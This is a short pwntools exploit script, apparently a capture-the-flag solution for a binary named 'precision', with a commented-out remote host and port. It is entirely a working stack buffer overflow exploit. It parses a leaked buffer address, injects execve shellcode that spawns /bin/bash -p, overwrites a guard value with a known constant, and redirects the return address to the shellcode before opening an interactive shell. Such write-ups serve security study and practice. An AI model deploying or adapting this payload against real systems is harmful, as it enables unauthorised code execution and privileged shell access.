#!/usr/bin/env python2.7
# coding: UTF-8

from pwn import *

r = process('./precision')
#r = remote("54.173.98.115", 1259)

msg = r.recvline()
print msg
buf_addr = int(msg[msg.find(':')+2:],16)

#shellcode = asm('mov al, 0xb0')
#shellcode += asm('shr al, 0x4')

shellcode = asm('mov al, 0x10')
shellcode += asm('sub al, 0x5')
shellcode += '\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'

print len(shellcode)
payload = shellcode
payload += "a"*(128-len(shellcode))
payload += p32(0x475a31a5)
'''
(gdb) x/x 0x8048690
0x8048690:	0x475a31a5
'''
payload += p32(0x40501555)
payload += "a"*12
payload += pack(buf_addr)
payload += '\n'


r.sendline(payload)

r.interactive()
